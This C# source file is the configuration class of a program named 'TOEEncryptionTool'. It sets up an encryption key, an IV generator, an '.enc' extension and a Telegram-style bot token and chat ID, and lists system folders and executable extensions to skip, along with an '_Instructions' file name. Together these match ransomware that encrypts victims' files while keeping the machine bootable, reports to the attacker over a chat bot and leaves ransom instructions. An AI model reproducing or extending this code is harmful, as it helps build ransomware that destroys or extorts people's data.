using System;
using System.Security.Cryptography;
using System.Text;

namespace TOEEncryptionTool
{
    internal static class Config
    {
        internal static readonly string IV = Byte2ToStr(IVGen());
        internal static readonly string ext = ".enc";
        private static string _token;
        private static string _key;
        private static string _ChatID;

        internal static string Token
        {
            get { return _token; }
        }
        internal static string Key
        {
            get { return _key; }
        }
        internal static string ChatID
        {
            get { return _ChatID; }
        }
        
        internal static void SetID(string chatID)
        {
            if (!string.IsNullOrEmpty(chatID))
            {
                _ChatID = chatID;
            }
            else
            {
                Console.WriteLine("Chat ID cannot be empty!");
            }
        }

        internal static void SetToken(string token)
        {
            if (token.Length > 46)
            {
                Console.WriteLine("Token is too large!");
            }
            else
            {
                _token = token;
            }
        }

        internal static void SetKey(string key)
        {
            if (key.Length == 32)
            {
                _key = key;
            }
            else
            {
                Console.WriteLine("Key must be 32 chars !");
            }
        }

        internal static byte[] IVGen()
        {
            using (RNGCryptoServiceProvider rngCsp = new RNGCryptoServiceProvider())
            {
                byte[] iv = new byte[8];
                rngCsp.GetBytes(iv);
                return iv;
            }
        }


        internal static string Byte2ToStr(byte[] bytes)
        {
            StringBuilder hex = new StringBuilder(bytes.Length * 2);

            foreach (byte b in bytes)
            {
                hex.AppendFormat("{0:x2}", b);
            }

            return hex.ToString();
        }

        internal static readonly string[] WhiteFldrs =
        {
            "\\AppData", "\\ApplicationData", "\\Windows", "\\Program Files\\",
            "\\Program Files (x86)\\", "\\recycle.bin", "\\config.msi",
            "\\$windows.~bt", "\\$windows.~ws\\", "\\Windows", "\\boot",
            "\\program files\\", "\\program files (x86)\\", "\\ProgramData",
            "\\System Volume Information\\", "Tor Browser\\", "\\windows.old",
            "\\intel", "\\msocache", "\\perflogs", "\\x64dbg", "\\Public",
            "\\All Users\\", "\\Default", "\\Microsoft", "\\$Recycle.Bin",
            "\\.", "\\$WinREAgent", "\\hp", "\\SWSetup", "\\System.sav", "\\go",
            "\\Boot", "\\winnt", "\\Roaming"
        };

        internal static readonly string[] WhiteExts =
        {
            ".386", ".adv", ".ani", ".bat", ".bin", ".cab", ".cmd",
            ".com", ".cpl", ".cur", ".deskthemepack", ".diagcab", ".diagcfg",
            ".diagpkg", ".dll", ".drv", ".exe", ".hlp", ".icl", ".icns", ".ico",
            ".ics", ".idx", ".ldf", ".lnk", ".mod", ".mpa", ".msc", ".msp",
            ".msstyles", ".msu", ".nls", ".nomedia", ".ocx", ".prf", ".ps1",
            ".rom", ".rtp", ".scr", ".shs", ".spl", ".sys", ".theme", ".themepack",
            ".wpx", ".lock", ".key", ".msi", ".pdb", ".search-ms", ".cement",
            ".ini", ".DAT", ".dat", ".sys", ".reg", ".pak", "IconCache.db",
            "pagefile.ini", "ntdlr", "_Instructions"
        };
    }


}